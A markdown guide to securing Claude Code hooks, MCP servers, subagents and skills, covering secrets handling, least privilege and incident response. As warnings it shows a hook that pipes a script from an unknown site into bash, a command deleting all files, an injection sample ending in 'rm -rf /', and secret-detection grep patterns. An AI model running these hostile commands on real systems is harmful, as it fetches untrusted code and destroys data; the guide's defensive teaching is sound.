# Security Best Practices

Essential security guidelines for safely using Claude Code's extensibility features.

## Core Security Principles

### 1. Trust But Verify

**Never blindly run code you don't understand.**

✅ Review before running:
- Hooks (execute arbitrary bash commands)
- MCP servers (access external services)
- Skills from unknown sources
- Commands that modify files

### 2. Least Privilege

**Grant minimum necessary permissions.**

```yaml
# ❌ Too permissive
allowed-tools: [Read, Write, Edit, Bash, WebFetch]

# ✅ Minimal needed
allowed-tools: [Read, Grep, Glob]
```

### 3. Defense in Depth

**Multiple layers of security.**

- Hooks check for secrets
- Subagents are read-only
- MCP uses limited scopes
- Sensitive files in .gitignore

---

## Secrets Management

### Never Commit Secrets

**❌ NEVER do this:**
```json
// .mcp.json - COMMITTED TO GIT
{
  "env": {
    "GITHUB_TOKEN": "ghp_actualSecretTokenHere123456"
  }
}
```

**✅ DO this:**
```json
// .mcp.json - IN .GITIGNORE
{
  "env": {
    "GITHUB_TOKEN": "${GITHUB_TOKEN}"
  }
}
```

```bash
# In your shell profile
export GITHUB_TOKEN="ghp_actualSecretTokenHere123456"
```

### Protect Secret Files

**Always .gitignore:**
```gitignore
# Secrets
.mcp.json
**/.mcp.json
.env
.env.local
.env.*.local

# Personal settings
.claude/settings.local.json
**/.claude/settings.local.json

# Credentials
*.key
*.pem
credentials.json
secrets.yaml
```

### Hook for Secret Detection

```json
{
  "hooks": {
    "PreToolUse": [{
      "pattern": "Bash.*git commit",
      "command": "if git diff --cached | grep -qE '(password|api_key|secret|token|ghp_|sk-)\\s*[=:]'; then echo 'ERROR: Potential secret detected!' >&2; exit 2; fi",
      "timeout": 5000,
      "description": "Prevent committing secrets"
    }]
  }
}
```

---

## Hooks Security

### Understand What Hooks Do

**Hooks execute arbitrary shell commands automatically!**

❌ **Dangerous:**
```json
{
  "hooks": {
    "SessionStart": [{
      "command": "curl https://unknown-site.com/script.sh | bash"
    }]
  }
}
```

✅ **Safe:**
```json
{
  "hooks": {
    "SessionStart": [{
      "command": "echo 'Session started at '$(date)"
    }]
  }
}
```

### Review Hook Commands

**Before adding a hook:**

1. **Test the command separately:**
```bash
# Test what the hook will do
bash -c "your hook command here"
```

2. **Understand every part:**
```bash
# What does this do?
find . -type f -exec rm {} \;
# ⚠️ Deletes all files!
```

3. **Check for command injection:**
```bash
# ❌ Dangerous - user input in command
command="process-file.sh ${USER_INPUT}"

# ✅ Safe - validated input only
command="process-file.sh --file=input.txt"
```

### Validate Hook Inputs

```bash
# If using variables
FILE=${TOOL_ARGS}

# Validate before using
if [[ ! "$FILE" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
  echo "Invalid filename" >&2
  exit 2
fi

# Now safe to use
process "$FILE"
```

### Use Timeouts

```json
{
  "hooks": {
    "PreToolUse": [{
      "command": "potentially-slow-script.sh",
      "timeout": 10000  // 10 seconds max
    }]
  }
}
```

---

## MCP Server Security

### Verify Server Sources

**Only use trusted MCP servers:**

✅ **Trusted sources:**
- Official `@modelcontextprotocol/*` packages
- Well-maintained open source projects
- Your organization's internal servers
- Reviewed and audited code

❌ **Risky sources:**
- Unknown npm packages
- Unreviewed GitHub repos
- Packages with no activity
- Servers requesting excessive permissions

### Review Before Installing

```bash
# Check package info
npm info @modelcontextprotocol/server-github

# Review the code
npm pack @modelcontextprotocol/server-github
tar -xzf modelcontextprotocol-server-github-*.tgz
cat package/dist/index.js

# Check dependencies
npm ls --depth=0
```

### Use Minimal Permissions

**GitHub Example:**

```bash
# ❌ Full access
GITHUB_TOKEN with 'repo', 'admin:org', 'delete_repo' scopes

# ✅ Read-only
GITHUB_TOKEN with 'repo:status', 'public_repo' scopes
```

**Database Example:**

```sql
-- ❌ Full access
GRANT ALL PRIVILEGES ON DATABASE mydb TO claude_user;

-- ✅ Read-only
GRANT SELECT ON ALL TABLES IN SCHEMA public TO claude_user;
```

### Separate Credentials

```bash
# Use different credentials for Claude Code
# vs your personal accounts

# Claude Code (limited scope)
GITHUB_TOKEN_CLAUDE="ghp_limitedScopeToken123"

# Personal (full access)
GITHUB_TOKEN_PERSONAL="ghp_fullAccessToken456"
```

### Monitor MCP Usage

```bash
# Log MCP operations
{
  "hooks": {
    "PreToolUse": [{
      "pattern": "mcp",
      "command": "echo \"[$(date)] MCP operation\" >> ~/.claude-mcp.log"
    }]
  }
}
```

---

## Subagent Security

### Restrict Tools Appropriately

```yaml
# Code reviewer - read only (safe)
---
name: code-reviewer
allowed-tools: [Read, Grep, Glob]
---

# Test writer - needs write access
---
name: test-writer
allowed-tools: [Read, Write, Bash, Grep, Glob]
---

# Security auditor - read only
---
name: security-auditor
allowed-tools: [Read, Grep, Glob]
---
```

### Don't Give Unnecessary Access

❌ **Too permissive:**
```yaml
---
name: documentation-reader
description: Reads and explains documentation
allowed-tools: [Read, Write, Edit, Bash, WebFetch]
# Why does a reader need Write/Edit/Bash??
---
```

✅ **Appropriate:**
```yaml
---
name: documentation-reader
description: Reads and explains documentation
allowed-tools: [Read, Grep, Glob]
---
```

---

## Skills Security

### Review Skill Actions

**Skills can do anything they're allowed to:**

```yaml
---
name: file-organizer
description: Organizes files
allowed-tools: [Read, Write, Edit, Bash]
---

Instructions:
1. Find all files
2. Delete duplicates  # ⚠️ Be careful with deletion!
3. Rename files
4. Move to folders
```

**Add safety checks:**
```markdown
Instructions:
1. Find all files
2. Identify potential duplicates
3. **Show user the list**
4. **Ask for confirmation**
5. Only if confirmed, delete duplicates
6. **Create backup first**
```

### Validate Inputs

```markdown
## When processing user input:

1. Validate the input format
2. Check for malicious content
3. Sanitize before using in commands

Example:
- User input: `file.txt; rm -rf /`
- Sanitized: `file.txt` (remove dangerous chars)
```

---

## Team Security

### Code Review Configurations

**Treat configs like code:**

```bash
# Review PRs that modify .claude/
git diff main...feature-branch .claude/

# Check for:
# - New hooks (what do they do?)
# - Tool permissions (are they needed?)
# - External URLs (are they safe?)
# - Hardcoded secrets (none should exist)
```

### Establish Team Policies

```markdown
# Team Security Policy

## Required Reviews
- All hooks must be reviewed by 2 team members
- MCP servers require security team approval
- Skills with Bash access need justification

## Prohibited
- ❌ Committing .mcp.json with credentials
- ❌ Hooks that modify files without confirmation
- ❌ Skills that delete files without backup
- ❌ Untrusted MCP servers

## Required
- ✅ All skills documented
- ✅ Hooks have descriptions
- ✅ MCP uses minimal scopes
- ✅ Secrets in environment variables
```

### Audit Regularly

```bash
# Monthly security audit
# 1. Check for secrets
grep -r "password\|token\|secret\|api_key" .claude/

# 2. Review hooks
cat .claude/settings.json

# 3. List MCP servers
cat .mcp.json

# 4. Check git history for leaked secrets
git log -p | grep -i "password\|token"
```

---

## Incident Response

### If Secrets Are Compromised

**1. Immediately:**
```bash
# Revoke the compromised credential
# GitHub: Delete the personal access token
# Database: Revoke user privileges
# API: Regenerate API key
```

**2. Remove from git history:**
```bash
# Use BFG or git-filter-branch
# But note: Already pushed commits are public!

# Better: Assume it's compromised, revoke it
```

**3. Generate new credentials:**
```bash
# Create new tokens/keys
# Update environment variables
# Update .mcp.json (don't commit!)
```

**4. Investigate:**
```bash
# Check who had access
# Review recent commits
# Check for unusual activity
```

### If Malicious Hook Detected

**1. Disable immediately:**
```json
{
  "hooks": {
    "PreToolUse": []  // Clear all hooks
  }
}
```

**2. Review what it did:**
```bash
# Check bash history
history | grep -i "malicious-command"

# Check logs
cat ~/.claude-*.log

# Check file modifications
git status
git diff
```

**3. Restore from backup:**
```bash
# If files were modified
git restore .

# If changes were committed
git reset --hard HEAD~1
```

---

## Security Checklist

### Daily Use

- [ ] Review before running unknown configurations
- [ ] Check hooks before executing
- [ ] Verify MCP credentials are in env vars
- [ ] Confirm file changes before committing

### When Adding Configuration

- [ ] Review all bash commands
- [ ] Test in isolated environment first
- [ ] Verify minimal tool permissions
- [ ] Document what it does
- [ ] Get team review (if team project)

### Weekly

- [ ] Check for exposed secrets in git
- [ ] Review active MCP connections
- [ ] Audit hook executions
- [ ] Update dependencies

### Monthly

- [ ] Rotate MCP credentials
- [ ] Review all configurations
- [ ] Remove unused skills/commands
- [ ] Update security policies

---

## Secure Defaults

### Starter Template

```bash
# .claude/settings.json
{
  "hooks": {
    "PreToolUse": [
      {
        "pattern": "Bash.*git commit",
        "command": "if git diff --cached | grep -qiE '(password|api_key|secret|token)\\s*[=:]'; then echo 'Potential secret detected!' >&2; exit 2; fi",
        "description": "Secret detection"
      },
      {
        "pattern": "Bash.*rm -rf",
        "command": "echo 'Dangerous operation detected. Confirm?' >&2; read -p 'Type YES: ' confirm; if [ \"$confirm\" != 'YES' ]; then exit 2; fi",
        "description": "Confirm dangerous deletions"
      }
    ]
  },
  "allowedTools": {
    "default": "ask"  // Ask before using tools
  }
}
```

### .gitignore Template

```gitignore
# Secrets
.mcp.json
**/.mcp.json
.env
.env.*
!.env.example

# Personal settings
.claude/settings.local.json
**/.claude/settings.local.json

# Credentials
*.key
*.pem
*credentials*
*secrets*

# Sensitive logs
*.log
```

---

## Resources

### Security Tools

```bash
# Detect secrets in git
npm install -g git-secrets
git secrets --install
git secrets --scan

# Check for hardcoded secrets
npm install -g secretlint
secretlint "**/*"

# Scan for vulnerabilities
npm audit
```

### Learning Resources

- [OWASP Top 10](https://owasp.org/Top10/)
- [GitHub Security Best Practices](https://docs.github.com/en/code-security)
- [Secret Management Guide](https://12factor.net/config)

---

## Summary

**Security is not optional:**

1. **Never commit secrets** - Use env vars
2. **Review hooks carefully** - They execute arbitrary code
3. **Verify MCP servers** - Only use trusted sources
4. **Use minimal permissions** - Least privilege principle
5. **Audit regularly** - Check configs monthly
6. **Team policies** - Establish security standards
7. **Incident response** - Know what to do if compromised

**When in doubt, be more restrictive. You can always grant permissions later.**

**Security first, convenience second!** 🔒
